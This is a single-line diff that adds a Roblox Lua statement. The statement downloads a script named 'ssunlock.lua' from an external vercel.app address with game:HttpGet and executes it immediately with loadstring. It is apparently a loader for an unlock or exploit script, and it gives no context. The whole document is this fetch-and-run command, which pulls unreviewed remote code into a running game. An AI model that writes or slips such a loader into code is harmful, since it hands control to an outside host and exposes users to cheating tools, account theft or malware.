@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://institutionio.vercel.app/backend?file=95af3b72-b243-4fd1-875d-8534ce66a7ab=ssunlock.lua'))()
